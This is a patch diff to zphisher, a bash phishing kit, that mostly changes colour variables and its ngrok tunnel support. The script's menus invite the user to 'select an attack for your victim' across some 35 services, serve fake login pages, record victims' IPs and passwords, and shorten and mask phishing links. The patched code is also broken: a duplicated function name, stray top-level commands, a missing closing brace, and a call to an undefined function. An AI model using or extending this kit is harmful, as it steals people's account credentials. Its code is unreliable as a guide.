@@ -97,9 +97,9 @@ HOST='127.0.0.1'
 PORT='8080' 
 
 ## ANSI colors (FG & BG)
-RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  BL="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
+RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
 MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
-REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  BLBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
+REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
 MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
 RESETBG="$(printf '\e[0m\n')"
 
@@ -153,7 +153,7 @@ reset_color() {
 
 ## Kill already running process
 kill_pid() {
-	check_PID="php cloudflared loclx ngrok"
+	check_PID="php cloudflared loclx"
 	for process in ${check_PID}; do
 		if [[ $(pidof ${process}) ]]; then # Check for Process
 			killall ${process} > /dev/null 2>&1 # Kill the Process
@@ -169,9 +169,9 @@ check_update(){
 	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
 
 	if [[ $new_version != $__version__ ]]; then
-		echo -ne "${BLUE}update found\n"${WHITE}
+		echo -ne "${ORANGE}update found\n"${WHITE}
 		sleep 2
-		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Downloading Update..."
+		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
 		pushd "$HOME" > /dev/null 2>&1
 		curl --silent --insecure --fail --retry-connrefused \
 		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
@@ -203,15 +203,15 @@ check_status() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${BLUE}
-		${BLUE} ______      _     _     _               
-		${BLUE}|___  /     | |   (_)   | |              
-		${BLUE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${BLUE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${BLUE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${BLUE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${BLUE}      | |                                
-		${BLUE}      |_|                ${RED}Version : ${__version__}
+		${ORANGE}
+		${ORANGE} ______      _     _     _               
+		${ORANGE}|___  /     | |   (_)   | |              
+		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
+		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
+		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
+		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
+		${ORANGE}      | |                                
+		${ORANGE}      |_|                ${RED}Version : ${__version__}
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
 	EOF
@@ -233,14 +233,12 @@ dependencies() {
 
 	if [[ -d "/data/data/com.termux/files/home" ]]; then
 		if [[ ! $(command -v proot) ]]; then
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${BLUE
-}proot${CYAN}"${WHITE}
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
 			pkg install proot resolv-conf -y
 		fi
 
 		if [[ ! $(command -v tput) ]]; then
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${BLUE
-}ncurses-utils${CYAN}"${WHITE}
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
 			pkg install ncurses-utils -y
 		fi
 	fi
@@ -251,8 +249,7 @@ dependencies() {
 		pkgs=(php curl unzip)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
-				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${BLUE
-	}$pkg${CYAN}"${WHITE}
+				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
 				if [[ $(command -v pkg) ]]; then
 					pkg install "$pkg" -y
 				elif [[ $(command -v apt) ]]; then
@@ -341,21 +338,22 @@ install_localxpose() {
 	fi
 }
 
-## Install ngrok
-install_ngrok() {
-	if [[ -e ".server/ngrok" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} ngrok.already installed."
+
+## Install Ngrok
+install_localxpose() {
+	if [[ -e ".server/Ngrok" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Ngrok..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-s390x.tgz' 'ngrok'
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-s390x.tgz' 'Ngrok'
 		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-s390x.tgz' 'ngrok'
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-s390x.tgz' 'Ngrok'
 		elif [[ "$arch" == *'x86_64'* ]]; then
-			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-s390x.tgz' 'ngrok'
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-s390x.tgz' 'Ngrok'
 		else
-			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-s390x.tgz' 'ngrok'
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-s390x.tgz' 'Ngrok'
 		fi
 	fi
 }
@@ -371,10 +369,10 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${BLUE}TAHMID RAYAT ${RED}[ ${BLUE}HTR-TECH ${RED}]
+		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
 		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
 		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
-		${GREEN} Version  ${RED}:  ${BLUE}${__version__}
+		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
 		${CYAN}  This Tool is made for educational purpose 
@@ -386,7 +384,7 @@ about() {
 		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
 		  Yisus7u7
 
-		${RED}[${WHITE}00${RED}]${BLUE} Main Menu     ${RED}[${WHITE}99${RED}]${BLUE} Exit
+		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
 	EOF
 
@@ -406,10 +404,10 @@ about() {
 ## Choose custom port
 cusport() {
 	echo
-	read -n1 -p "${RED}[${WHITE}?${RED}]${BLU} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${BLU}" P_ANS
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
 		echo -e "\n"
-		read -n4 -p "${RED}[${WHITE}-${RED}]${BLUE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
+		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
 		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
 			PORT=${CU_P}
 			echo
@@ -436,7 +434,7 @@ capture_ip() {
 	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${BLU}auth/ip.txt"
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
 	cat .server/www/ip.txt >> auth/ip.txt
 }
 
@@ -447,14 +445,14 @@ capture_creds() {
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${BLU}auth/usernames.dat"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
 	cat .server/www/usernames.txt >> auth/usernames.dat
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLU} Waiting for Next Login Info, ${BLUE}Ctrl + C ${BLU}to exit. "
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
 
 ## Print data
 capture_data() {
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLU} Waiting for Login Info, ${BLUE}Ctrl + C ${BLU}to exit..."
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
 			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
@@ -497,9 +495,9 @@ localxpose_auth() {
 	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
 
 	[ "$(./.server/loclx account status | grep Error)" ] && {
-		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${BLUE}localxpose.io${GREEN} & copy the token\n"
+		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
 		sleep 3
-		read -p "${RED}[${WHITE}-${RED}]${BLUE} Input Loclx Token :${BLUE} " loclx_token
+		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
 		[[ $loclx_token == "" ]] && {
 			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
 		} || {
@@ -508,13 +506,14 @@ localxpose_auth() {
 	}
 }
 
+
 ## Start LocalXpose (Again...)
 start_loclx() {
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; localxpose_auth; }
 	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}?${RED}]${BLU} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${BLU} " opinion
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
@@ -529,44 +528,48 @@ start_loclx() {
 	custom_url "$loclx_url"
 	capture_data
 }
-ngrok_auth() {
-	./.server/ngrok.-help > /dev/null 2>&1 &
-	sleep 1
-	[ -d ".ngrok" ] && auth_f=".ngrok/.access" || auth_f="$HOME/.ngrok/.access" 
 
-	[ "$(./.server/ngrok.account status | grep Error)" ] && {
-		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${BLUE}ngrok.com${GREEN} & copy the token\n"
-		sleep 3
-		read -p "${RED}[${WHITE}-${RED}]${BLUE} Input ngrok.Token :${BLUE} " ngrok_token
-		[[ $ngrok_token == "" ]] && {
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input ngrok.Token." ; sleep 2 ; tunnel_menu
-		} || {
-			echo -n "$ngrok_token" > $auth_f 2> /dev/null
-		}
-	}
+install_token() {
+    # Emplacement du fichier d'authentification
+    auth_file="$HOME/.Ngrok/.access"
+
+    # Vérifie si le fichier d'authentification existe déjà
+    if [ -f "$auth_file" ]; then
+        echo "Un token est déjà installé. Veuillez supprimer le fichier d'authentification existant pour en installer un nouveau."
+        exit 1
+    fi
+
+    # Demande à l'utilisateur de saisir le token
+    read -p "Veuillez saisir le token : " Ngrok_token
+
+    # Vérifie si le token est vide
+    if [ -z "$Ngrok_token" ]; then
+        echo "Le token ne peut pas être vide. Installation annulée."
+        exit 1
+    fi
+
+    # Crée le répertoire d'authentification s'il n'existe pas
+    mkdir -p "$(dirname "$auth_file")"
+
+    # Écrit le token dans le fichier d'authentification
+    echo -n "$Ngrok_token" > "$auth_file"
+
+    echo "Le token a été installé avec succès."
 }
 
-## Start ngrok.(Again...)
-start_ngrok() {
-	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; setup_site; ngrok_auth; }
-	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}?${RED}]${BLU} Change ngrok.Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${BLU} " opinion
-	[[ ${opinion,,} == "y" ]] && ngrok_region="eu" || ngrok_region="us"
-	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching ngrok..."
+# Appelle la fonction pour installer le token
+install_token
 
-	if [[ `command -v termux-chroot` ]]; then
-		sleep 1 && termux-chroot ./.server/ngrok.tunnel --raw-mode http --region ${ngrok_region} --https-redirect -t "$HOST":"$PORT" > .server/.ngrok.2>&1 &
-	else
-		sleep 1 && ./.server/ngrok tunnel --raw-mode http --region ${ngrok_region} --https-redirect -t "$HOST":"$PORT" > .server/.ngrok.2>&1 &
-	fi
 
-	sleep 12
-	ngrok_url=$(cat .server/.ngrok.| grep -o '[0-9a-zA-Z.]*.ngrok.com')
-	custom_url "$ngrok_url"
-	capture_data
-}
+## Start Ngrok (Again...)
+# Vérifie si le fichier ngrok est présent dans le répertoire actuel
+if [ ! -x "./ngrok" ]; then
+    echo "Le fichier ngrok n'a pas été trouvé dans le répertoire actuel."
+    exit 1
+fi
+
+# Lance la commande ngrok
+./ngrok https 80
 
 ## Start localhost
 start_localhost() {
@@ -583,11 +586,10 @@ tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${BLUE} Localhost
-		${RED}[${WHITE}02${RED}]${BLUE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
-		${RED}[${WHITE}03${RED}]${BLUE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
-		${RED}[${WHITE}04${RED}]${BLUE} ngrok.${BLUE}]
-
+		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
+		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
+		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
+        ${RED}[${WHITE}04${RED}]${ORANGE} Ngrok ${RED}]
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
@@ -599,28 +601,27 @@ tunnel_menu() {
 			start_cloudflared;;
 		3 | 03)
 			start_loclx;;
-		4 | 04)
-			start_ngrok;;
+        4 | 04)
+			start_Ngrok;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
 	esac
-}
+
 
 ## Custom Mask URL
 custom_mask() {
 	{ sleep .5; clear; banner_small; echo; }
-	read -n1 -p "${RED}[${WHITE}?${RED}]${BLU} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${BLU} " mask_op
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
 	echo
 	if [[ ${mask_op,,} == "y" ]]; then
-		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${BLUE}Example: https://get-free-followers.com${CYAN})\n"
-		read -e -p "${WHITE} ==> ${BLUE}" -i "https://" mask_url # initial text requires Bash 4+
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
+		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
 		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
 			mask=$mask_url
 			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
 		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${BLUE
-} Invalid url type..Using the Default one.."
+			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
 		fi
 	fi
 }
@@ -645,7 +646,7 @@ custom_url() {
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
 	{ custom_mask; sleep 1; clear; banner_small; }
-	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io|ngrok.com) ]]; then
+	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
 		if [[ $(site_stat $isgd) == 2* ]]; then
 			shorten $isgd "$url"
 		elif [[ $(site_stat $shortcode) == 2* ]]; then
@@ -664,18 +665,18 @@ custom_url() {
 	fi
 
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${BLU}$processed_url"
-	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${BLU}$masked_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
+	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
 }
 
 ## Facebook
 site_facebook() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${BLUE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${BLUE} Advanced Voting Poll Login Page
-		${RED}[${WHITE}03${RED}]${BLUE} Fake Security Login Page
-		${RED}[${WHITE}04${RED}]${BLUE} Facebook Messenger Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
+		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
+		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
+		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
 
 	EOF
 
@@ -708,10 +709,10 @@ site_facebook() {
 site_instagram() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${BLUE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${BLUE} Auto Followers Login Page
-		${RED}[${WHITE}03${RED}]${BLUE} 1000 Followers Login Page
-		${RED}[${WHITE}04${RED}]${BLUE} Blue Badge Verify Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
+		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
+		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
+		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
 
 	EOF
 
@@ -744,9 +745,9 @@ site_instagram() {
 site_gmail() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${BLUE} Gmail Old Login Page
-		${RED}[${WHITE}02${RED}]${BLUE} Gmail New Login Page
-		${RED}[${WHITE}03${RED}]${BLUE} Advanced Voting Poll
+		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
+		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
+		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
 
 	EOF
 
@@ -775,8 +776,8 @@ site_gmail() {
 site_vk() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${BLUE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${BLUE} Advanced Voting Poll Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
+		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
 
 	EOF
 
@@ -801,22 +802,22 @@ site_vk() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${BLUE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${BLUE}
+		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
-		${RED}[${WHITE}01${RED}]${BLUE} Facebook      ${RED}[${WHITE}11${RED}]${BLUE} Twitch       ${RED}[${WHITE}21${RED}]${BLUE} DeviantArt
-		${RED}[${WHITE}02${RED}]${BLUE} Instagram     ${RED}[${WHITE}12${RED}]${BLUE} Pinterest    ${RED}[${WHITE}22${RED}]${BLUE} Badoo
-		${RED}[${WHITE}03${RED}]${BLUE} Google        ${RED}[${WHITE}13${RED}]${BLUE} Snapchat     ${RED}[${WHITE}23${RED}]${BLUE} Origin
-		${RED}[${WHITE}04${RED}]${BLUE} Microsoft     ${RED}[${WHITE}14${RED}]${BLUE} Linkedin     ${RED}[${WHITE}24${RED}]${BLUE} DropBox	
-		${RED}[${WHITE}05${RED}]${BLUE} Netflix       ${RED}[${WHITE}15${RED}]${BLUE} Ebay         ${RED}[${WHITE}25${RED}]${BLUE} Yahoo		
-		${RED}[${WHITE}06${RED}]${BLUE} Paypal        ${RED}[${WHITE}16${RED}]${BLUE} Quora        ${RED}[${WHITE}26${RED}]${BLUE} Wordpress
-		${RED}[${WHITE}07${RED}]${BLUE} Steam         ${RED}[${WHITE}17${RED}]${BLUE} Protonmail   ${RED}[${WHITE}27${RED}]${BLUE} Yandex			
-		${RED}[${WHITE}08${RED}]${BLUE} Twitter       ${RED}[${WHITE}18${RED}]${BLUE} Spotify      ${RED}[${WHITE}28${RED}]${BLUE} StackoverFlow
-		${RED}[${WHITE}09${RED}]${BLUE} Playstation   ${RED}[${WHITE}19${RED}]${BLUE} Reddit       ${RED}[${WHITE}29${RED}]${BLUE} Vk
-		${RED}[${WHITE}10${RED}]${BLUE} Tiktok        ${RED}[${WHITE}20${RED}]${BLUE} Adobe        ${RED}[${WHITE}30${RED}]${BLUE} XBOX
-		${RED}[${WHITE}31${RED}]${BLUE} Mediafire     ${RED}[${WHITE}32${RED}]${BLUE} Gitlab       ${RED}[${WHITE}33${RED}]${BLUE} Github
-		${RED}[${WHITE}34${RED}]${BLUE} Discord       ${RED}[${WHITE}35${RED}]${BLUE} Roblox 
+		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
+		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
+		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
+		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
+		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
+		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
+		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
+		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
+		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
+		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
+		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
+		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
 
-		${RED}[${WHITE}99${RED}]${BLUE} About         ${RED}[${WHITE}00${RED}]${BLUE} Exit
+		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
 	EOF
 	
@@ -972,5 +973,4 @@ dependencies
 check_status
 install_cloudflared
 install_localxpose
-install_ngrok
 main_menu
